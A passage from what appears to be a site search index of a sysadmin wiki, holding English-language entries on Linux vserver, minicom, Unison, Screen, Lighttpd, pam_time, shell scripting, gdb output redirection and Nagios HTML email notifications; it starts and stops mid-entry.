8210 0 12:49 pts/2 00:00:00 -bash root 8271 1 ALL_PROC 8102 0 12:57 pts/1 00:00:00 vps -ef root 8272 1 ALL_PROC 8271 0 12:57 pts/1 00:00:00 ps -ef Automatically Starting a Vserver at Machine Boot linkTo automatically start a vserver when the machine boots, simply create a mark file on the desired machine and insert default:\necho \"default\" \u003e /etc/vservers/my_vserver/apps/init/mark Here the vserver called “my_vserver” will start automatically when the machine boots.\nMounting a Folder in Multiple Locations at the Same Time linkModify the file /etc/vservers/my_server/fstab. Here’s an example:\n/mnt/backups/disk_array0 /mnt/backups/disk_array0 none acl,bind 0 0 Changing the TMP Size linkModify the file /etc/vservers/my_server/fstab, by default the /tmp is 16MB, simply modify the Size parameter and restart the Vserver afterwards:\nnone /tmp tmpfs size=2g,mode=1777 0 0 Information on Running VMs linkTo get information, you need to run a command to get the number of a VM that interests us:\n# vserver-stat CTX PROC VSZ RSS userTIME sysTIME UPTIME NAME 0 71 1.1G 101.1M 2h33m03 7m39s14 4d01h03 root server 49159 2 14.8M 1.4M 0m00s00 0m00s00 29m09s20 deb-vserv1 49163 2 14.8M 1.4M 0m00s00 0m00s00 0m00s69 deb-vserv2 The number in the CTX column corresponds to the VM number.\nRAM linkIf we take 49159 as an example, we can find out the current RAM:\n# cat /proc/virtual/49159/limit PROC: 2 4 -1 0 VM: 3808 11410 100000 0 VML: 0 0 -1 0 RSS: 282 1163 -1 0 ANON: 81 81 -1 0 FILES: 37 37 -1 0 OFD: 22 22 -1 0 LOCKS: 1 1 -1 0 SOCK: 1 1 -1 0 MSGQ: 0 0 -1 0 SHM: 0 0 -1 0 Here, we have 3808KB used, 11410KB is the maximum memory that has already been used, and the limit is set to 100000KB.\nLoad Average linkFor load average, it’s also useful since we can monitor other things. Still on 49159:\ncat cvirt BiasUptime: 347673.95 SysName: Linux NodeName: deb-vserv1 Release: 2.6.18-4-xen-vserver-amd64 Version: #1 SMP Wed Apr 18 20:24:37 UTC 2007 Machine: x86_64 DomainName: (none) nr_threads: 2 nr_running: 0 nr_unintr: 0 nr_onhold: 0 load_updates: 418 loadavg: 0.00 0.00 0.00 total_forks: 38 Here we have quite a bit of info on the OS as well.\nFAQ linkI’m encountering various network problems linkSetting network flags (nflags) link Add the flags to a file named nflags: echo HIDE_NETIF \u003e\u003e nflags The default nflags are: HIDE_NETIF Setting network capabilities (ncaps) link Add the capabilities to a file named ncapabilities: echo ^12 \u003e\u003e ncapabilities There are no default ncaps. DNS resolution doesn’t work linkIt’s possible that you have a cache Bind server on your host machine that prevents resolution via other DNS servers. In this case, simply authorize the range of your virtual machines to resolve via this bind server.\nResources link Virtualization of servers using Linux vserver Documentation on Memory Allocation Documentation Multi Vservers Xen and vserver: monitoring VMs on a PHP page Documentation on Setting up a Web Server with Apache, LVS and Heartbeat 2 Capabilities and Flags Going further with Linux vserver https://linux-vserver.org/Networking_vserver_guests https://fr.wikibooks.org/wiki/Linux_VServer "
            }
        );
    index.add(
            {
                id:  389 ,
                href: "\/Se_connecter_par_port_serie_sur_sa_debian\/",
                title: "Connect to Debian via Serial Port",
                description: "Guide to set up and use a serial port connection to a Linux machine, including minicom configuration and Grub setup.",
                content: "Introduction linkThis documentation helps you set up a connection to a Linux machine via a serial port. It also explains how to configure minicom.\nInstallation linkOn Debian:\napt-get install minicom Configuration linkLinux linkFirst, we need to determine your COM port configuration:\n$ dmesg | grep tty [ 0.004000] console [tty0] enabled [ 1.629013] tty ttye7: hash matches [ 1.629021] tty ttyba: hash matches [ 12.843809] usb 5-2: pl2303 converter now attached to ttyUSB0 [ 129.343389] type=1503 audit(1230854350.490:5): operation=\"inode_permission\" requested_mask=\"w::\" denied_mask=\"w::\" fsuid=0 name=\"/dev/ttyUSB0\" pid=6609 profile=\"/usr/sbin/cupsd\" We can see that ttyUSB0 is detected here.\nMac linkOn Mac, remember to install your drivers if you don’t find /dev/cu.usbserial. As you may have guessed, this is the device to use.\nLaunch minicom with your regular user:\nminicom -s To launch the help, press Ctrl+A and Z. In our case, we want to configure the communication device and speed. Press the “O” key and follow the instructions.\nSetting up the COM port in Grub linkDocumentation on setting up the serial port to connect to Debian\n"
            }
        );
    index.add(
            {
                id:  390 ,
                href: "\/Unison_:_Sauvegarde_comme_rsync_mais_bidirectionnelle\/",
                title: "Unison: Backup like rsync but bidirectional",
                description: "How to use Unison for bidirectional file synchronization between systems",
                content: "Introduction linkUnison is a popular file synchronization software that also offers functionality for creating and managing directory backups. The synchronization is bidirectional (meaning that modifications in one directory are reflected in the other and vice-versa), making it useful for keeping directories in sync between two different machines.\nUnison is free software released under the GPL license. It works on a wide range of operating systems (Windows, Linux, Mac OS X), allowing file synchronization between different operating systems.\nInstallation linkOn Debian, installation is very simple once again:\naptitude install unison Configuration linkI recommend checking the manual for complete information on how it works, but I’ll provide a configuration that I use to replicate my website. Rather than using a long command line, I prefer using a configuration file that contains all the elements I want to back up and how to handle conflicts. In ~/.unison, you can create *.prf files. Here’s my configuration:\nroot = /var/www root = ssh://192.168.90.1//var/www ignore = Name w3tc ignore = Name piwik/tmp ignore = Name captcha-temp batch = true auto = true silent = true log = true logfile = /tmp/unison.log The options used are:\nroot: The two sources and destinations to replicate. I use one local host and another over SSH. ignore: Allows using restrictions batch: We’re in automatic mode and want to avoid being asked questions auto: Indicates that we’ll use unison in an automated way silent: Silent prevents any output log: We enable logging logfile: We indicate where we want the logs (by default ~/unison.log) Usage linkTo use the configuration file we just created, it’s very simple:\nunison www.prf You can also use options one after another (in nearly the same format, see the manual) if you don’t want to use a configuration file.\n"
            }
        );
    index.add(
            {
                id:  391 ,
                href: "\/Screen_:_Les_commandes_les_plus_utilis%C3%A9es\/",
                title: "Screen: Most Used Commands",
                description: "Guide to using Screen for maintaining persistent terminal sessions, with most commonly used commands and multi-user configuration.",
                content: "Introduction linkScreen is really great, but if you don’t use it every day, you can quickly lose track of the commands. Screen is used to keep a session open, possibly with an application running in it. When you exit the window and come back later, your application is still running and you can completely take control of it again.\nI want to warn you, as I have seen many people do this, but screen is not equivalent to nohup!\nInstallation linkAs usual:\napt-get install screen Usage linkHere are the main commands I use (c-a = Ctrl+a):\nc-a c new window c-a k close a window c-a p previous window c-a n next window c-a d detach (leave screen running in the background) c-a \" display all available windows c-a [0-9] go to window 0-9 c-a S Split the screen c-a move to the next window c-a X Close the split window c-a q Close all split windows c-a M Monitor a window Muti-users linkMethode 1 linkOn the first machine, start a screen with user toto:\nscreen Then from a second machine, connect via ssh directly with user toto and do:\nscreen -x Now both people can interact directly together. There are also ACLs for screen.\nMethode 2 linkUsing screen in multiuser mode requires screen to be setuid root. If you know about the potential security implications you can enable it by issuing:\nchmod u+s `which screen` chmod 755 /var/run/screen We need to configure screen to use multiuser mode and change privileges for the guest. Put the following commands into ~/.screenrc. You can also use them in a screen session after pressing CTRL-a:\nmultiuser on aclchg snoopy -x \"?\" #Revoke permission to execute any screen command aclchg snoopy +x \"wall\" #Allow writing simple messages in the terminal status line aclumask snoopy-wx #Default permissions to windows acladd snoopy #Enable user snoopy to access screen session Start screen:\nuser@localhost $ screen user@localhost $ screen -ls There is a screen on: 11521.pts-4.hostname (Multi, attached) 1 Socket in /var/run/screen/S-user. Now the guest can attach to the screen:\nscreen -r user/11521 ACL linkTo allow toto to view the session without being able to act on it:\naclchg toto -w \"#?\" By default, permissions are “rwx”. Here are other very understandable examples:\naclchg toto -wx \"#?\" aclchg toto +x \"detatch,wall,colon\" The last command only authorizes certain options to be executed. Wall allows you to send messages to all connected screens.\nConfiguration link.screenrc linkTo see my screen configuration, I invite you to visit my git: https://git.deimos.fr\nFor the configuration possibilities of the screenrc file, here’s a small reminder:\nColors in screenrc ------------------ 0 Black . leave color unchanged 1 Red b blue 2 Green c cyan 3 Brown / yellow d default color 4 Blue g green b bold 5 Purple k blacK B blinking 6 Cyan m magenta d dim 7 White r red r reverse 8 unused/illegal w white s standout 9 transparent y yellow u underline note: \"dim\" is not mentioned in the manual. STRING ESCAPES -------------- %% percent sign (the escape character itself) %a either 'am' or 'pm' - according to the current time %A either 'AM' or 'PM' - according to the current time %c current time HH:MM in 24h format %C current time HH:MM in 12h format %d day number - number of current day %D Day's name - the weekday name of the current day %f flags of the window %F sets %? to true if the window has the focus %h hardstatus of the window %H hostname of the system %l current load of the system %m month number %M month name %n window number %s seconds %t window title %u all other users on this window %w all window numbers and names. %-w all window numbers up to the current window %+w all window numbers after the current window %W all window numbers and names except the current one %y last two digits of the year number %Y full year number References linkFile:Au-gnu screen-pdf.pdf\n"
            }
        );
    index.add(
            {
                id:  392 ,
                href: "\/Lighttpd_:_Installation_et_configuration_d\u0027une_alternative_d\u0027Apache\/",
                title: "Lighttpd: Installation and configuration of an Apache alternative",
                description: "A guide for installing and configuring Lighttpd as a fast and flexible alternative to Apache with various configuration examples",
                content: "Introduction linkLigHTTPd (or “lighty”) is a secure, fast, and flexible HTTP server.\nIts speed comes from having a smaller memory footprint than other HTTP servers, as well as intelligent CPU load management.\nMany languages like PHP, Perl, Ruby, and Python are supported via FastCGI.\nThe main disadvantage of LigHTTPd is that it has only one configuration file and doesn’t support .htaccess files (though there are alternatives): directives must be in the configuration file. This is also an advantage, as the server administrator only has one file to manage.\nIn April 2007, LigHTTPd entered the Top 5 of the most widely used web servers.\nInstallation linkTo install it, it’s simple:\napt-get install lighttpd Installation of the PHP module link apt-get install php5-cgi php5 To enable it, do:\nlighty-enable-mod fastcgi We’ll also add these few lines at the end of the configuration file:\n... fastcgi.server = ( \".php\" =\u003e (( \"bin-path\" =\u003e \"/usr/bin/php5-cgi\", \"socket\" =\u003e \"/tmp/php.socket\" ))) Then reload Lighttpd:\n/etc/init.d/lighttpd force-reload Configuration linkForcing SSL redirections linkIt can be useful to redirect part of your traffic to SSL. This is my case for mediawiki which doesn’t take SSL into account during authentication (or I don’t know how to do it, but it doesn’t matter, the idea here is to have a small exercise):\n# Mediawiki secure auth $SERVER[\"socket\"] == \":80\" { $HTTP[\"host\"] =~ \"(.*)\" { url.redirect = ( \"^/(.*Connexion\\\u0026returnto.*)\" =\u003e \"https://%1/$1\" ) } } Here I’m telling it:\nEverything that comes in on port 80 From any host If it arrives on a page containing ‘Connexion\u0026returnto’ Then it is redirected to https at the same location as the previous one Differentiating logs linkFor example, I want to differentiate the logs of my blog as well as the rest of my domain and my wiki to be able to process them correctly with awstats. Here’s how to do it:\n... # Deimos Domain $HTTP[\"host\"] =~ \"deimos\\.fr\" { server.document-root = \"/var/www/deimos.fr\" # Default logs accesslog.filename = \"/var/log/lighttpd/access-blog_and_co.log\" # Wiki logs $HTTP[\"url\"] =~ \"^/blocnotesinfo/\" { accesslog.filename = \"/var/log/lighttpd/access-deimos-wiki.log\" } } ... Blocking access to your site via Internet Explorer linkIt is possible to block access to all kinds of browsers. If like me, you’re not friends with IE (which breaks your PNGs in version 6, doesn’t respect standards, breaks CSS, etc.), it might be useful to block it and kindly indicate to the user to download Firefox as soon as possible.\nI did it under Apache and here I couldn’t pass up the opportunity to do it for Lighttpd, so here’s the solution:\n$HTTP[\"useragent\"] =~ \".*(MSIE|Opera).*\" { $HTTP[\"url\"] !~ \"^/ie.html\" { url.redirect = ( \"\" =\u003e \"/ie.html\" ) } } All that’s left is to create the ie.html file and put your nice text in it (you can also make a simple text file). Here’s what I use (/var/www/ie.html):\n\u003c!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"\u003e Access Forbidden with Internet Explorer Dear Internet User,\nThis site is not accessible using Internet Explorer that you are using.\nYou must now understand that times are changing.\nYou are currently using a browser (Internet Explorer) that does not respect\nthe standards and has the monopoly, due to its mandatory presence in your\ndear OS (Windows). That said, you may be at work and don't have a choice of OS.\nHowever, Internet Explorer should no longer be used when there are all kinds of\nother free, open source browsers that respect standards!\nBut since you don't seem to be aware, that's okay, let me help you.\nTo start, you can download a clean browser such as Firefox.\nThis would already help you get on the right track and will also allow you to access\nmy site.\nStill in your new quest to the light side of the force, you should switch to\na free and open source OS (Ubuntu for example) which will surely make you happy.\nI invite you to take matters into your own hands as soon as possible.\nSincerely,\nPierre (aka Deimos) Access restriction by login and password linkHtaccess files don’t exist in Lighttpd, but there is an equivalent. Check before you start that the mod_auth module is loaded. First, we’ll generate (with -c for the first time, like htaccess) a file containing the credentials for authorization to view a particular site:\nhtdigest -c /etc/lighttpd/.passwd 'Authorized users only' deimos Here I’m creating the user deimos. The realm (here ‘Authorized users only’) will allow us to differentiate between the different login/password files we’ll have since we can only specify one for the entire server.\nThen add these lines to the global lighttpd configuration:\nauth.backend = \"htdigest\" auth.backend.htdigest.userfile = \"/etc/lighttpd/.passwd\" auth.debug = 2 Then I add protection at the location I’m interested in:\nauth.require = ( \"/docs/\" =\u003e ( \"method\" =\u003e \"digest\", \"realm\" =\u003e \"Authorized users only\", \"require\" =\u003e \"valid-user\" ) ) Restart lighty and you’re done.\nAdding compression linkTo speed up the display of your website, it’s recommended to enable compression. By default, not enough elements are compressed, so you’ll need to define more in the standard configuration. Note: Enabling compression will put a bit more load on your server’s CPU/RAM.\nEdit your lighty configuration to configure the compress module:\nserver.modules = ( \"mod_alias\", \"mod_compress\", \"mod_rewrite\", \"mod_redirect\", \"mod_cgi\", # \"mod_usertrack\", # \"mod_expire\", # \"mod_flv_streaming\", # \"mod_evasive\" ) ... #### compress module compress.cache-dir = \"/var/cache/lighttpd/compress/\" #compress.filetype = (\"text/plain\", \"text/html\", \"application/x-javascript\", \"text/css\") compress.filetype = (\"application/x-javascript\", \"application/javascript\", \"text/javascript\", \"text/x-js\", \"text/css\", \"text/html\", \"text/plain\") ... PHP5 compression will save us precious seconds on page display. To enable it, edit the following file and set the parameter to “on”:\n; Transparent output compression using the zlib library ; Valid values for this option are 'off', 'on', or a specific buffer size ; to be used for compression (default is 4KB) ; Note: Resulting chunk size may vary due to nature of compression. PHP ; outputs chunks that are few hundreds bytes each as a result of ; compression. If you prefer a larger chunk size for better ; performance, enable output_buffering in addition. ; Note: You need to use zlib.output_handler instead of the standard ; output_handler, or otherwise the output will be corrupted. ; http://php.net/zlib.output-compression zlib.output_compression = on Then restart your web server for the configuration to be applied.\nFAQ linkSymbol `FamErrlist’ has different size in shared object, consider re-linking linkIf you get this kind of error when restarting Lighttpd:\nStopping web server: lighttpd. Starting web server: lighttpd/usr/sbin/lighttpd: Symbol `FamErrlist' has different size in shared object, consider re-linking 2010-08-20 21:58:02: (network.c.345) can't bind to port: :: 80 Address already in use failed! This is due to a bug with IPv6 on Debian. To solve the problem, you need to install libfam0 which also causes these kinds of bugs:\naptitude install libfam0 and in the Lighttpd configuration, configure these lines like this:\n#include_shell \"/usr/share/lighttpd/use-ipv6.pl\" server.socket = \"[::]\" All that’s left is to restart Lighttpd :-)\nsockets disabled, connection limit reached linkIf your server stops abruptly and you get this kind of message:\n2011-05-06 14:18:24: (server.c.1398) [note] sockets disabled, connection limit reached 2011-05-06 14:19:27: (server.c.1512) server stopped by UID = 0 PID = 19214 It’s simply that you’ve exceeded the maximum number of file descriptors. You just need to increase the current value. To find out which one is currently applied (default 1024), just run this command:\n\u003e cat /proc/`ps ax | grep lighttpd | grep -v grep | awk -F \" \" '{print $1}'`/limits |grep \"Max open files\" Max open files 1024 1024 files Here it is limited to 1024. To increase this value, edit the lighty conf file and increase the value:\nserver.max-fds = 2048 All that’s left is to restart lighty.\nbackend is overloaded; we’ll disable it for 1 seconds and send the request to another backend instead: reconnects linkIf you get this kind of message with a nice 500 error:\n2011-05-09 09:06:07: (mod_fastcgi.c.2764) fcgi-server re-enabled: 0 /tmp/php.socket 2011-05-09 09:06:07: (mod_fastcgi.c.2764) fcgi-server re-enabled: 0 /tmp/php.socket 2011-05-09 09:06:07: (mod_fastcgi.c.2764) fcgi-server re-enabled: 0 /tmp/php.socket 2011-05-09 09:06:07: (mod_fastcgi.c.2764) fcgi-server re-enabled: 0 /tmp/php.socket 2011-05-09 09:06:10: (mod_fastcgi.c.3001) backend is overloaded; we'll disable it for 1 seconds and send the request to another backend instead: reconnects: 0 load: 521 2011-05-09 09:06:10: (mod_fastcgi.c.3001) backend is overloaded; we'll disable it for 1 seconds and send the request to another backend instead: reconnects: 1 load: 521 2011-05-09 09:06:10: (mod_fastcgi.c.3001) backend is overloaded; we'll disable it for 1 seconds and send the request to another backend instead: reconnects: 2 load: 521 2011-05-09 09:06:10: (mod_fastcgi.c.3001) backend is overloaded; we'll disable it for 1 seconds and send the request to another backend instead: reconnects: 3 load: 521 It’s because your fastcgi limits have been exceeded. To solve the problem, here’s the configuration to modify:\nfastcgi.server = ( \".php\" =\u003e (( \"bin-path\" =\u003e \"/usr/bin/php5-cgi\", \"socket\" =\u003e \"/tmp/php.socket\", \"max-procs\" =\u003e 10, \"bin-environment\" =\u003e ( \"PHP_FCGI_CHILDREN\" =\u003e \"10\", \"PHP_FCGI_MAX_REQUESTS\" =\u003e \"500\" ) ) )) Then adjust the lines above to accommodate the maximum number of clients you want, as well as the number of instances. You can test your new configuration with the “ab” command.\nMore info on this page: https://redmine.lighttpd.net/wiki/1/Docs:PerformanceFastCGI\nResources link Documentation on installing Lighttpd With PHP5 And MySQL Support Documentation on reducing Apache’s load with lighttpd Optimizing Lighttpd server load https://redmine.lighttpd.net/wiki/lighttpd/Docs https://redmine.lighttpd.net/wiki/lighttpd/Docs:ConfigurationOptions Installing Lighttpd With PHP5 And MySQL Support On Debian Lenny "
            }
        );
    index.add(
            {
                id:  393 ,
                href: "\/Pam_time:_Mettre_des_restrictions_sur_les_logins\/",
                title: "PAM Time: Setting Login Restrictions",
                description: "How to use PAM Time module to set various login restrictions like time-based and access-based restrictions on Linux systems.",
                content: "Introduction linkpam_time is able to make several kinds of restrictions like:\nTime Based Restrictions Access Based Restrictions I’ll explain here how to use those options.\nUsage linkTime Based Restrictions linkThese examples will limit the login times of certain users. See /etc/security/time.conf for more information/examples. In order to place time restrictions on user logins, the following must be placed in /etc/pam.d/login:\naccount required /lib/security/pam_time.so The remaining lines should be placed in /etc/security/time.conf.\nOnly allow user nikesh to login during on weekdays between 7 am and 5 pm: login;*;nikesh;Wd0700-1700 Allow users A \u0026 B to login on all days between 8 am and 5 pm except for Sunday. login;*;A If a day is specified more than once, it is unset. So in the above example, Sunday is specified twice (Al = All days, Su = Sunday). This causes it to be unset, so this rule applies to all days except Sunday.\nAccess Based Restrictions link/etc/security/access.conf can be used to restrict access by terminal or host. The following must be placed in /etc/pam.d/login in order for these examples to work:\naccount required /lib/security/pam_access.so Deny nikesh login access on all terminals except for tty1: -:nikesh:ALL EXCEPT tty1 Users in the group operator are only allowed to login from a local terminal: -:operator:ALL EXCEPT LOCAL Allow user A to only login from a trusted server: -:A:ALL EXCEPT trusted.somedomain.com Resources linkhttps://linuxpoison.blogspot.com/2009/05/how-to-set-login-time-based.html?utm_source=feedburner\u0026utm_medium=feed\u0026utm_campaign=Feed%3A+blogspot%2FfrEh+%28Linux+Poison%29\u0026utm_content=Google+Reader\n"
            }
        );
    index.add(
            {
                id:  394 ,
                href: "\/Introduction_au_Script_Shell\/",
                title: "Introduction to Shell Scripting",
                description: "A comprehensive guide to shell scripting basics including shell variables, flow control, parameters, file operations, and signal handling.",
                content: "Introduction linkBourne-again shell is the free command interpreter of the GNU project. Its name is a play on words (Bourne again / born again) referring to the historic Unix shell, the Bourne shell. Based on the latter, it brings many improvements, notably from the Korn shell and the C shell.\nThe original author is Brian Fox of the Free Software Foundation, later succeeded by Chet Ramey. The original Bourne shell was written by Steve Bourne.\nBash is free software published under the GPL license. It is the default interpreter on many free Unix systems, particularly on GNU/Linux systems. It’s also the default shell for Mac OS X and has been ported to Windows through the Cygwin project.\nBash uses the readline library which allows it, like the C shell, to automatically complete command and file names when typing the TAB key, which considerably speeds up work. The UP and DOWN keys allow easy navigation through command history.\nCreating a Shell Script linkCreating a script is very simple, just create a file and make it executable:\ntouch test.sh \u0026\u0026 chmod 700 test.sh Data Streams linkShell data streams are transported through three different channels:\nstandard input standard output standard error output Standard Input linkStandard input is the input data channel used by the system. By default, it’s the keyboard.\nThus, Shell commands take their parameters from the standard input.\nStandard Output linkStandard output is the data output channel. This is the channel through which the data resulting from the execution of a command flows. It’s usually a terminal, meaning the screen.\nThus, Shell commands very often write results to standard output.\nStandard Error Output linkStandard error output is the channel through which error messages pass, usually the screen. Sometimes a window is specially dedicated to this channel.\nWhenever an error code is generated by a command, a message is sent on this channel.\nRedirections linkIt’s possible to temporarily change the standard inputs and outputs during the execution of a command.\nFor example, you want to write to a file the list of files in a directory. The ls command allows you to list the files in a directory. This command sends the result of its search to standard output (screen).\nExample: $ ls amoi.c montage.jpg tp3.c lettre.doc tp1.c zizitop.mp3 monprog.c tp2.c To redirect standard output to a file, use the special character \u003e.\nExample: $ ls \u003e liste.txt If you display the contents of the file on the screen, you’ll see that it contains what the command should have displayed on the screen.\nExample: $ cat liste.txt amoi.c montage.jpg tp3.c lettre.doc tp1.c zizitop.mp3 monprog.c tp2.c The \u003e character allows you to create the file if it doesn’t exist when the command is executed. If the file already exists, its content is overwritten.\nTo keep the file’s content intact and write to the end of it, use the special character ».\nExample: echo \"List of my directory\" \u003e\u003e liste.txt The echo command allows you to display text on standard output, which is here redirected to the liste.txt file, to which the character string passed as an argument is written.\nExample: $ cat liste.txt amoi.c montage.jpg tp3.c lettre.doc tp1.c zizitop.mp3 monprog.c tp2.c List of my directory We see that the file’s content hasn’t been overwritten and that it contains an additional phrase.\nThe following table summarizes the special redirection characters.\nCharacter Description \u003e Redirects standard output. » Redirects standard output without overwriting. \u003c Redirects standard input. 2\u003e Redirects standard error output. 2» Redirects standard error output without overwriting. Special Characters linkIn addition to the standard data stream redirection characters, the Shell has characters whose meaning is very… special. Here they are grouped in the following table.\nCharacter Description * Metacharacter that replaces any string (even empty). Example: cp * DATA copies all files to the DATA directory. ? Metacharacter that replaces any single character. ; Allows separating multiple commands written on the same line. Example: cp *.c DATA; tar cvf data.tar DATA copies all files with extension .c to the DATA directory and archives them in the data.tar file. ( ) Groups commands. Example: (echo “List:”; ls ) \u003e liste.txt writes the string “List:” and the list of files in the current directory to the liste.txt file. \u0026 Allows launching a process in the background. This allows executing other commands while a process is running. Example: netscape\u0026. | Allows communication through a pipe between two commands. Example: ls -1 | file - the file listing command (ls) sends each file to the command that allows knowing the type of a file (file). # Introduces a comment. So everything that follows this character in a line is ignored by the Shell. Example: # this is a comment. \\ De-specializes the character that follows. That is, if the character that follows this one is a special character, then the Shell will ignore it. Example: echo Bon*jour displays bon*jour on the screen. ‘…’ Defines a string of characters that will not be evaluated by the Shell. Example: echo ‘*?\u0026’ displays the special characters *?\u0026 on standard output without interpreting them. “…” Defines a string of characters whose variables will be evaluated by the Shell. Example: echo “You are $USER.” displays You are + the value of the $USER variable. `…` Defines a string of characters that will be interpreted as a command and replaced by the string that would be returned on standard output when executing said command. Example: echo `pwd` » liste.txt writes at the end of the file the path and name of the current directory. The special character used is obtained by the key combination: AltGr + 7 (it’s the grave accent). Shell Variables linkEnvironment Variables linkThe Shell, like MS-DOS, has environment variables that allow keeping important information in memory such as the user’s login (stored in the $USER variable) as well as their home directory ($HOME), the list of directories in which to look for executables of external commands ($PATH), and many others…\nThe env command displays the list of all the Shell’s environment variables with their values.\nYou can display available variables with the env command.\nOther Variables link Variable Description $$ PID of the current Shell process. $! PID of the last process launched in the background. $? Error code returned by the last command (0: true; otherwise false). Declaration linkThe user can easily declare new variables by directly assigning a value.\nSyntax: name=value\nThe variable’s value can be numeric or a character string, its format doesn’t matter.\nExample: EMAIL=xxx@mycompany.com Manipulation\nA variable can be used in any circumstance as long as it’s in the Shell. Its name must be preceded by the dollar sign ($) and be in braces ({}) if another word is contiguous to it.\nExamples:\n$ echo $EMAIL xxx@mycompany.com $ echo \"My email: $EMAIL\" My email: xxx@mycompany.com $ echo 'My email: $EMAIL' My email: $EMAIL In the first example, the EMAIL variable is passed directly as a parameter to the echo command which displays it after the Shell has evaluated its value.\nIn the second example, a string containing the same variable is passed as a parameter to echo. Double quotes are special characters (\"…\") that force the Shell to evaluate the value of variables contained in the string between double quotes. The echo command therefore displays the string on the screen.\nAnd finally, this time the single quotes forbid the Shell from evaluating the value of the variable. So echo displays the raw string.\nOther Examples link $ moi=deimos; echo $moi deimos $ phrase=\"Hello $moi\"; echo $phrase Hello deimos $ rep=`pwd`; echo $rep /home/deimos/data In the second example, the variable is in braces so that the Shell can distinguish it from the characters that follow.\nIn the last example, the rep variable contains a string between grave accents, which forces the Shell to interpret it as a command and replace it with the string that would be returned on standard output when executing said command. Command Files\nCommand files (scripts) are text files that contain Shell commands ordered by control structures. Execution\nTo execute a script, several solutions:\nSyntax: sh script This syntax launches a new Shell process that reads its commands from the script file. This file must be readable.\nSyntax: . script The terminal is momentarily replaced by the script file that must be readable (no new process created).\nSyntax: script Launches a new Shell process that reads its commands from the file which must be readable and executable.\nSyntax: exec script The current Shell is replaced by a Shell process that reads its commands from the file which must be readable and executable.\nParameters linkIt’s possible to execute a script by passing arguments to it like any other command.\nThe following table summarizes the variables accessible to a script:\nVariable Description $# Number of arguments. $* List of arguments. $0 Command name. $1 Value of the first parameter. $i Value of the ith parameter if i is between 1 and 9. $9 Value of the ninth parameter. Creating Variables on the Fly linkSince bash is not a real programming language, there are many things that become difficult to do when you push it to its limits. In short, if you need to declare variables on the fly, here’s an example:\nf=0 for j in `echo $nodes` ; do f=`expr $f + 1` local porttest_node$f=`ssh root@$node1 netstat -auntp | grep :$clientport | grep -c \"LISTEN\"` done Reading a File Line by Line linkIf you need to read a file line by line, as you can do in some more advanced languages, here’s an example:\nwhile read line; do echo \"$(date),$(hostname),$line\"; done \u003c somefile.txt Capturing Signals linkCapturing signals is so practical. For those who don’t understand or have no notion of these mechanisms, it’s quite simple. During a SIGHUP and other program closures, you can perform various actions using the trap command:\ntrap \"echo \\\"$0 process $$ killed on $(date).\\\"; exit \" HUP INT QUIT ABRT TERM STOP Hiding a Password During Keyboard Input linkIt may be useful when a user enters something on the keyboard to hide it from the screen. This is done as follows in shell script:\nsave_state=$(stty -g) echo -n \"Password: \" stty -echo read password stty \"$save_state\" echo \"\" echo \"You inserted $password as password\" References linkDocumentation on Unix initiation and shell scripts\n"
            }
        );
    index.add(
            {
                id:  395 ,
                href: "\/Rediriger_l%5C%27output_d%5C%27un_service_vers_un_fichier\/",
                title: "Redirect a Service Output to a File",
                description: "How to redirect a program's output to a file using GDB.",
                content: "Introduction linkIt can be useful to redirect a program’s output to a file. Here’s how to do it.\nUsage link yes 'Y'|gdb -ex 'p close(1)' -ex 'p creat(\"/tmp/output.txt\",0600)' -ex 'q' -p pid This command uses the GDB debugger to attach to a running process and reassign the file handle to a file.\nThe two commands executed in GDB are:\np close(1) which closes STDOUT and\np creat(\"/tmp/filename\",0600) which creates a file and opens it for output to which the process will be assigned.\nSequentially, this command closes the STDOUT file handle, creates a new output file, and captures the output to this file.\n"
            }
        );
    index.add(
            {
                id:  396 ,
                href: "\/Nagios_:_Am%C3%A9liorer_le_look_des_emails_de_notification\/",
                title: "Nagios: Improving the Look of Notification Emails",
                description: "How to improve the appearance of Nagios notification emails using HTML formatting instead of plain text",
                content: "Introduction linkIf you’ve already used standard email notification in Nagios, you’ll find it functional but not really attractive. That’s why a project called “Flexible Notifications for Nagios” was initiated.\nI will explain here how to use it easily. The goal is to have HTML email notifications like this instead of plain text:\nYou can also do other things like adding images, carbon copies, different languages… but I’ll explain here only what I need.\nInstallation linkVery simple, create a scripts folder and put the 2 required scripts in it:\nmkdir -p /etc/nagios3/scripts cd /etc/nagios3/scripts wget \"http://nagios.frank4dd.com/howto/source/nagios_send_host_mail.pl\" wget \"http://nagios.frank4dd.com/howto/source/nagios_send_service_mail.pl\" chmod 755 nagios_send_host_mail.pl nagios_send_service_mail.pl Also we’ll need to install perl dependencies:\naptitude install libmail-sendmail-perl librrds-perl Configuration linkcommands.cfg linkHere is the file containing default email commands. You just have to comment the ones shown below and add the new lines (/etc/nagios3/commands.cfg):\n############################################################################### # COMMANDS.CFG - SAMPLE COMMAND DEFINITIONS FOR NAGIOS ################################################################################ ################################################################################ # NOTIFICATION COMMANDS ################################################################################ # 'notify-service-by-email' command definition define command{ command_name notify-host-by-email command_line /bin/sleep 1 } # 'notify-host-by-email' command definition #define command{ # command_name notify-host-by-email # command_line /usr/bin/printf \"%b\" \"***** INTERNAL Nagios *****\\n\\nNotification Type: $NOTIFICATIONTYPE$\\nHost: $HOSTNAME$\\nState: $HOSTSTATE$\\nAddress: $HOSTADDRESS$\\nInfo: $HOSTOUTPUT$\\n\\nDate/Time: $LONGDATETIME$\\n\" | /usr/bin/mail -s \"** Internal $NOTIFICATIONTYPE$ Host Alert: $HOSTNAME$ is $HOSTSTATE$ **\" $CONTACTEMAIL$ # } # sends HTML e-mails for hosts define command{ command_name host-notify-by-email command_line /etc/nagios3/scripts/nagios_send_service_mail.pl -c \"$CONTACTADDRESS1$\" -f html -u -p \"Deimos.fr Monitoring Tool\" } # 'notify-host-by-email' command definition #define command{ # command_name host-notify-by-email # command_line /usr/bin/printf \"%b\" \"***** Nagios *****\\n\\nNotification Type: $NOTIFICATIONTYPE$\\nHost: $HOSTNAME$\\nState: $HOSTSTATE$\\nAddress: $HOSTADDRESS$\\nInfo: $HOSTOUTPUT$\\n\\nDate/Time: $LONGDATETIME$\\n$HOSTACKAUTHOR$: $NOTIFICATIONCOMMENT$\\n\\n$HOSTNOTES$\\n\" | /usr/bin/mail -s \"** $NOTIFICATIONTYPE$ Host Alert: $HOSTNAME$ is $HOSTSTATE$ **\" $CONTACTEMAIL$ # } # sends HTML e-mails for services define command{ command_name notify-service-by-email command_line 